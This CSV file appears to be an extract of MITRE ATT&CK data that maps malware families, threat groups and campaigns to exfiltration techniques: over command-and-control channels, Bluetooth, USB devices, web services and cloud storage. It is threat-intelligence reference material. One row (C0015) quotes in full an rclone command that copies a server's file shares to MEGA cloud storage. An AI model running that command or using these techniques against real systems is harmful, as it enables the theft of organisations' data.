ID,Name,Description,Techniques,Tactics,Techniques-Description,Techniques-Name
S0441,PowerShower,"PowerShower has used a PowerShell document stealer module to pack and exfiltrate .txt, .pdf, .xls or .doc files smaller than 5MB that were modified during the past two days.",T1041,Exfiltration,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,Exfiltration Over C2 Channel
S0238,Proxysvc,Proxysvc performs data exfiltration over the control server channel using a custom protocol.,T1041,Exfiltration,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,Exfiltration Over C2 Channel
S0078,Psylo,Psylo exfiltrates data to its C2 server over the same protocol as C2 communications.,T1041,Exfiltration,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,Exfiltration Over C2 Channel
S0147,Pteranodon,Pteranodon exfiltrates screenshot files to its C2 server.,T1041,Exfiltration,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,Exfiltration Over C2 Channel
S0192,Pupy,"Pupy can send screenshots files, keylogger data, files, and recorded audio back to the C2 server.",T1041,Exfiltration,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,Exfiltration Over C2 Channel
S0650,QakBot,"QakBot can send stolen information to C2 nodes including passwords, accounts, and emails.",T1041,Exfiltration,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,Exfiltration Over C2 Channel
S1148,Raccoon Stealer,Raccoon Stealer uses existing HTTP-based command and control channels for exfiltration.,T1041,Exfiltration,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,Exfiltration Over C2 Channel
S0495,RDAT,RDAT can exfiltrate data gathered from the infected system via the established Exchange Web Services API C2 channel.,T1041,Exfiltration,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,Exfiltration Over C2 Channel
S0375,Remexi,"Remexi performs exfiltration over BITSAdmin, which is also used for the C2 channel.",T1041,Exfiltration,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,Exfiltration Over C2 Channel
S0496,REvil,REvil can exfiltrate host and malware information to C2 servers.,T1041,Exfiltration,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,Exfiltration Over C2 Channel
S0448,Rising Sun,Rising Sun can send data gathered from the infected machine via HTTP POST request to the C2.,T1041,Exfiltration,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,Exfiltration Over C2 Channel
S0240,ROKRAT,ROKRAT can send collected files back over same C2 channel.,T1041,Exfiltration,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,Exfiltration Over C2 Channel
S1078,RotaJakiro,RotaJakiro sends device and other collected data back to the C2 using the established C2 channels over TCP.,T1041,Exfiltration,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,Exfiltration Over C2 Channel
S0085,S-Type,S-Type has uploaded data and files from a compromised host to its C2 servers.,T1041,Exfiltration,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,Exfiltration Over C2 Channel
S1210,Sagerunex,Sagerunex encrypts collected system data then exfiltrates via existing command and control channels.,T1041,Exfiltration,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,Exfiltration Over C2 Channel
G0034,Sandworm Team,Sandworm Team has sent system information to its C2 server using HTTP.,T1041,Exfiltration,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,Exfiltration Over C2 Channel
S0461,SDBbot,SDBbot has sent collected data from a compromised host to its C2 servers.,T1041,Exfiltration,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,Exfiltration Over C2 Channel
S1019,Shark,Shark has the ability to upload files from the compromised host over a DNS or HTTP C2 channel.,T1041,Exfiltration,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,Exfiltration Over C2 Channel
S1089,SharpDisco,SharpDisco can load a plugin to exfiltrate stolen files to SMB shares also used in C2.,T1041,Exfiltration,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,Exfiltration Over C2 Channel
S0445,ShimRatReporter,ShimRatReporter sent generated reports to the C2 via HTTP POST requests.,T1041,Exfiltration,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,Exfiltration Over C2 Channel
S1178,ShrinkLocker,ShrinkLocker will exfiltrate victim system information along with the encryption key via an HTTP POST.,T1041,Exfiltration,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,Exfiltration Over C2 Channel
S0610,SideTwist,SideTwist has exfiltrated data over its C2 channel.,T1041,Exfiltration,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,Exfiltration Over C2 Channel
S0692,SILENTTRINITY,SILENTTRINITY can transfer files from an infected host to the C2 server.,T1041,Exfiltration,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,Exfiltration Over C2 Channel
S0633,Sliver,Sliver can exfiltrate files from the victim using the download command.,T1041,Exfiltration,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,Exfiltration Over C2 Channel
S0533,SLOTHFULMEDIA,SLOTHFULMEDIA has sent system information to a C2 server via HTTP and HTTPS POST requests.,T1041,Exfiltration,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,Exfiltration Over C2 Channel
S0649,SMOKEDHAM,SMOKEDHAM has exfiltrated data to its C2 server.,T1041,Exfiltration,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,Exfiltration Over C2 Channel
S1166,Solar,Solar can send staged files to C2 for exfiltration.,T1041,Exfiltration,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,Exfiltration Over C2 Channel
S0615,SombRAT,SombRAT has uploaded collected data and files from a compromised host to its C2 server.,T1041,Exfiltration,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,Exfiltration Over C2 Channel
S0543,Spark,Spark has exfiltrated data over the C2 channel.,T1041,Exfiltration,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,Exfiltration Over C2 Channel
S1030,Squirrelwaffle,Squirrelwaffle has exfiltrated victim data using HTTP POST requests to its C2 servers.,T1041,Exfiltration,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,Exfiltration Over C2 Channel
S1037,STARWHALE,STARWHALE can exfiltrate collected data to its C2 servers.,T1041,Exfiltration,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,Exfiltration Over C2 Channel
G0038,Stealth Falcon,"After data is collected by Stealth Falcon malware, it is exfiltrated over the existing C2 channel.",T1041,Exfiltration,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,Exfiltration Over C2 Channel
S1183,StrelaStealer,StrelaStealer exfiltrates collected email credentials via HTTP POST to command and control servers.,T1041,Exfiltration,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,Exfiltration Over C2 Channel
S1034,StrifeWater,StrifeWater can send data and files from a compromised host to its C2 server.,T1041,Exfiltration,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,Exfiltration Over C2 Channel
S0491,StrongPity,StrongPity can exfiltrate collected documents through C2 channels.,T1041,Exfiltration,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,Exfiltration Over C2 Channel
S0603,Stuxnet,Stuxnet sends compromised victim information via HTTP.,T1041,Exfiltration,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,Exfiltration Over C2 Channel
S1042,SUGARDUMP,SUGARDUMP has sent stolen credentials and other data to its C2 server.,T1041,Exfiltration,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,Exfiltration Over C2 Channel
S1064,SVCReady,SVCReady can send collected data in JSON format to its C2 server.,T1041,Exfiltration,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,Exfiltration Over C2 Channel
S0663,SysUpdate,SysUpdate has exfiltrated data over its C2 channel.,T1041,Exfiltration,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,Exfiltration Over C2 Channel
S0467,TajMahal,TajMahal has the ability to send collected files over its C2.,T1041,Exfiltration,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,Exfiltration Over C2 Channel
S0595,ThiefQuest,ThiefQuest exfiltrates targeted file extensions in the /Users/ folder to the command and control server via unencrypted HTTP. Network packets contain a string with two pieces of information: a file path and the contents of the file in a base64 encoded string.,T1041,Exfiltration,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,Exfiltration Over C2 Channel
S0671,Tomiris,"Tomiris can upload files matching a hardcoded set of extensions, such as .doc, .docx, .pdf, and .rar, to its C2 server.",T1041,Exfiltration,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,Exfiltration Over C2 Channel
S0678,Torisma,Torisma can send victim data to an actor-controlled C2 server.,T1041,Exfiltration,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,Exfiltration Over C2 Channel
S1201,TRANSLATEXT,TRANSLATEXT has exfiltrated collected credentials to the C2 server.,T1041,Exfiltration,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,Exfiltration Over C2 Channel
S0266,TrickBot,TrickBot can send information about the compromised host and upload data to a hardcoded C2 server.,T1041,Exfiltration,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,Exfiltration Over C2 Channel
S1196,Troll Stealer,Troll Stealer exfiltrates collected information to its command and control infrastructure.,T1041,Exfiltration,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,Exfiltration Over C2 Channel
S0386,Ursnif,Ursnif has used HTTP POSTs to exfil gathered information.,T1041,Exfiltration,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,Exfiltration Over C2 Channel
S0476,Valak,Valak has the ability to exfiltrate data over the C2 channel.,T1041,Exfiltration,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,Exfiltration Over C2 Channel
S0670,WarzoneRAT,WarzoneRAT can send collected victim data to its C2 server.,T1041,Exfiltration,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,Exfiltration Over C2 Channel
G1035,Winter Vivern,Winter Vivern delivered a PowerShell script capable of recursively scanning victim machines looking for various file types before exfiltrating identified files via HTTP.,T1041,Exfiltration,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,Exfiltration Over C2 Channel
G0102,Wizard Spider,Wizard Spider has exfiltrated domain credentials and network enumeration information over command and control (C2) channels.,T1041,Exfiltration,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,Exfiltration Over C2 Channel
S1065,Woody RAT,Woody RAT can exfiltrate files from an infected machine to its C2 server.,T1041,Exfiltration,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,Exfiltration Over C2 Channel
S0658,XCSSET,"XCSSET retrieves files that match the pattern defined in the INAME_QUERY variable within the user's home directory, such as *test.txt, and are below a specific size limit. It then archives the files and exfiltrates the data over its C2 channel.",T1041,Exfiltration,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,Exfiltration Over C2 Channel
S0251,Zebrocy,Zebrocy has exfiltrated data to the designated C2 server using HTTP POST requests.,T1041,Exfiltration,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,Exfiltration Over C2 Channel
G0128,ZIRCONIUM,ZIRCONIUM has exfiltrated files via the Dropbox API C2.,T1041,Exfiltration,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,Exfiltration Over C2 Channel
S0086,ZLib,ZLib has sent data and files from a compromised host to its C2 servers.,T1041,Exfiltration,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,Exfiltration Over C2 Channel
S0143,Flame,"Flame has a module named BeetleJuice that contains Bluetooth functionality that may be used in different ways, including transmitting encoded information from the infected system over the Bluetooth protocol, acting as a Bluetooth beacon, and identifying other Bluetooth devices in the vicinity.",T1011.001,Exfiltration,"Adversaries may attempt to exfiltrate data over Bluetooth rather than the command and control channel. If the command and control network is a wired Internet connection, an adversary may opt to exfiltrate data using a Bluetooth communication channel.",Exfiltration Over Bluetooth
S0092,Agent.btz,Agent.btz creates a file named thumb.dd on all USB flash drives connected to the victim. This file contains information about the infected system and activity logs.,T1052.001,Exfiltration,"Adversaries may attempt to exfiltrate data over a USB connected physical device. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a USB device introduced by a user. The USB device could be used as the final exfiltration point or to hop between otherwise disconnected systems.",Exfiltration over USB
S0409,Machete,Machete has a feature to copy files from every drive onto a removable drive in a hidden folder.,T1052.001,Exfiltration,"Adversaries may attempt to exfiltrate data over a USB connected physical device. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a USB device introduced by a user. The USB device could be used as the final exfiltration point or to hop between otherwise disconnected systems.",Exfiltration over USB
G0129,Mustang Panda,Mustang Panda has used a customized PlugX variant which could exfiltrate documents from air-gapped networks.,T1052.001,Exfiltration,"Adversaries may attempt to exfiltrate data over a USB connected physical device. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a USB device introduced by a user. The USB device could be used as the final exfiltration point or to hop between otherwise disconnected systems.",Exfiltration over USB
S0125,Remsec,Remsec contains a module to move data from airgapped networks to Internet-connected systems by using a removable USB device.,T1052.001,Exfiltration,"Adversaries may attempt to exfiltrate data over a USB connected physical device. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a USB device introduced by a user. The USB device could be used as the final exfiltration point or to hop between otherwise disconnected systems.",Exfiltration over USB
S0035,SPACESHIP,SPACESHIP copies staged data to removable drives when they are inserted into the system.,T1052.001,Exfiltration,"Adversaries may attempt to exfiltrate data over a USB connected physical device. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a USB device introduced by a user. The USB device could be used as the final exfiltration point or to hop between otherwise disconnected systems.",Exfiltration over USB
G0081,Tropic Trooper,Tropic Trooper has exfiltrated data using USB storage devices.,T1052.001,Exfiltration,"Adversaries may attempt to exfiltrate data over a USB connected physical device. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a USB device introduced by a user. The USB device could be used as the final exfiltration point or to hop between otherwise disconnected systems.",Exfiltration over USB
S0136,USBStealer,USBStealer exfiltrates collected files via removable media from air-gapped victims.,T1052.001,Exfiltration,"Adversaries may attempt to exfiltrate data over a USB connected physical device. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a USB device introduced by a user. The USB device could be used as the final exfiltration point or to hop between otherwise disconnected systems.",Exfiltration over USB
S0622,AppleSeed,AppleSeed has exfiltrated files using web services.,T1567,Exfiltration,"Adversaries may use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel. Popular Web services acting as an exfiltration mechanism may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to compromise. Firewall rules may also already exist to permit traffic to these services.",Exfiltration Over Web Service
G0007,APT28,APT28 can exfiltrate data over Google Drive.,T1567,Exfiltration,"Adversaries may use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel. Popular Web services acting as an exfiltration mechanism may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to compromise. Firewall rules may also already exist to permit traffic to these services.",Exfiltration Over Web Service
C0051,APT28 Nearest Neighbor Campaign,"During APT28 Nearest Neighbor Campaign, APT28 exfiltrated data over public-facing webservers – such as Google Drive.",T1567,Exfiltration,"Adversaries may use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel. Popular Web services acting as an exfiltration mechanism may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to compromise. Firewall rules may also already exist to permit traffic to these services.",Exfiltration Over Web Service
G1043,BlackByte,BlackByte has used services such as anonymfiles.com and file.io to exfiltrate victim data.,T1567,Exfiltration,"Adversaries may use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel. Popular Web services acting as an exfiltration mechanism may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to compromise. Firewall rules may also already exist to permit traffic to these services.",Exfiltration Over Web Service
C0017,C0017,"During C0017, APT41 used Cloudflare services for data exfiltration.",T1567,Exfiltration,"Adversaries may use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel. Popular Web services acting as an exfiltration mechanism may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to compromise. Firewall rules may also already exist to permit traffic to these services.",Exfiltration Over Web Service
S0547,DropBook,DropBook has used legitimate web services to exfiltrate data.,T1567,Exfiltration,"Adversaries may use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel. Popular Web services acting as an exfiltration mechanism may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to compromise. Firewall rules may also already exist to permit traffic to these services.",Exfiltration Over Web Service
S1179,Exbyte,Exbyte exfiltrates collected data to online file hosting sites such as Mega.co.nz.,T1567,Exfiltration,"Adversaries may use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel. Popular Web services acting as an exfiltration mechanism may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to compromise. Firewall rules may also already exist to permit traffic to these services.",Exfiltration Over Web Service
G0059,Magic Hound,Magic Hound has used the Telegram API sendMessage to relay data on compromised devices.,T1567,Exfiltration,"Adversaries may use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel. Popular Web services acting as an exfiltration mechanism may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to compromise. Firewall rules may also already exist to permit traffic to these services.",Exfiltration Over Web Service
S0508,ngrok,ngrok has been used by threat actors to configure servers for data exfiltration.,T1567,Exfiltration,"Adversaries may use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel. Popular Web services acting as an exfiltration mechanism may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to compromise. Firewall rules may also already exist to permit traffic to these services.",Exfiltration Over Web Service
S1171,OilCheck,OilCheck can upload documents from compromised hosts to a shared Microsoft Office 365 Outlook email account for exfiltration.,T1567,Exfiltration,"Adversaries may use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel. Popular Web services acting as an exfiltration mechanism may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to compromise. Firewall rules may also already exist to permit traffic to these services.",Exfiltration Over Web Service
S1168,SampleCheck5000,SampleCheck5000 can use the Microsoft Office Exchange Web Services API to access an actor-controlled account and retrieve files for exfiltration.,T1567,Exfiltration,"Adversaries may use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel. Popular Web services acting as an exfiltration mechanism may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to compromise. Firewall rules may also already exist to permit traffic to these services.",Exfiltration Over Web Service
S0363,Empire,Empire can use GitHub for data exfiltration.,T1567.001,Exfiltration,"Adversaries may exfiltrate data to a code repository rather than over their primary command and control channel. Code repositories are often accessible via an API (ex: https://api.github.com). Access to these APIs are often over HTTPS, which gives the adversary an additional level of protection.",Exfiltration to Code Repository
G1024,Akira,Akira will exfiltrate victim data using applications such as Rclone.,T1567.002,Exfiltration,"Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.",Exfiltration to Cloud Storage
C0040,APT41 DUST,APT41 DUST exfiltrated collected information to OneDrive.,T1567.002,Exfiltration,"Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.",Exfiltration to Cloud Storage
S0635,BoomBox,BoomBox can upload data to dedicated per-victim folders in Dropbox.,T1567.002,Exfiltration,"Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.",Exfiltration to Cloud Storage
S0651,BoxCaon,BoxCaon has the capability to download folders' contents on the system and upload the results back to its Dropbox drive.,T1567.002,Exfiltration,"Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.",Exfiltration to Cloud Storage
C0015,C0015,"During C0015, the threat actors exfiltrated files and sensitive data to the MEGA cloud storage site using the Rclone command rclone.exe copy --max-age 2y ""\\SERVER\Shares"" Mega:DATA -q --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M.",T1567.002,Exfiltration,"Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.",Exfiltration to Cloud Storage
G0114,Chimera,Chimera has exfiltrated stolen data to OneDrive accounts.,T1567.002,Exfiltration,"Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.",Exfiltration to Cloud Storage
G1021,Cinnamon Tempest,"Cinnamon Tempest has uploaded captured keystroke logs to the Alibaba Cloud Object Storage Service, Aliyun OSS.",T1567.002,Exfiltration,"Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.",Exfiltration to Cloud Storage
S0660,Clambling,Clambling can send files from a victim's machine to Dropbox.,T1567.002,Exfiltration,"Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.",Exfiltration to Cloud Storage
G0142,Confucius,Confucius has exfiltrated victim data to cloud storage service accounts.,T1567.002,Exfiltration,"Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.",Exfiltration to Cloud Storage
S1023,CreepyDrive,CreepyDrive can use cloud services including OneDrive for data exfiltration.,T1567.002,Exfiltration,"Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.",Exfiltration to Cloud Storage
S0538,Crutch,Crutch has exfiltrated stolen data to Dropbox.,T1567.002,Exfiltration,"Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.",Exfiltration to Cloud Storage
G1006,Earth Lusca,Earth Lusca has used the megacmd tool to upload stolen files from a victim network to MEGA.,T1567.002,Exfiltration,"Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.",Exfiltration to Cloud Storage
G1003,Ember Bear,Ember Bear has used tools such as Rclone to exfiltrate information from victim environments to cloud storage such as mega.nz.,T1567.002,Exfiltration,"Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.",Exfiltration to Cloud Storage
S0363,Empire,Empire can use Dropbox for data exfiltration.,T1567.002,Exfiltration,"Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.",Exfiltration to Cloud Storage
G0046,FIN7,FIN7 has exfiltrated stolen data to the MEGA file sharing site.,T1567.002,Exfiltration,"Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.",Exfiltration to Cloud Storage
G0125,HAFNIUM,"HAFNIUM has exfiltrated data to file sharing sites, including MEGA.",T1567.002,Exfiltration,"Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.",Exfiltration to Cloud Storage
S0037,HAMMERTOSS,HAMMERTOSS exfiltrates data by uploading it to accounts created by the actors on Web cloud storage providers for the adversaries to retrieve later.,T1567.002,Exfiltration,"Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.",Exfiltration to Cloud Storage
G1001,HEXANE,"HEXANE has used cloud services, including OneDrive, for data exfiltration.",T1567.002,Exfiltration,"Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.",Exfiltration to Cloud Storage
G0119,Indrik Spider,Indrik Spider has exfiltrated data using Rclone or MEGASync prior to deploying ransomware.,T1567.002,Exfiltration,"Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.",Exfiltration to Cloud Storage
G0094,Kimsuky,Kimsuky has exfiltrated stolen files and data to actor-controlled Blogspot accounts.,T1567.002,Exfiltration,"Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.",Exfiltration to Cloud Storage
G0065,Leviathan,Leviathan has used an uploader known as LUNCHMONEY that can exfiltrate files to Dropbox.,T1567.002,Exfiltration,"Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.",Exfiltration to Cloud Storage
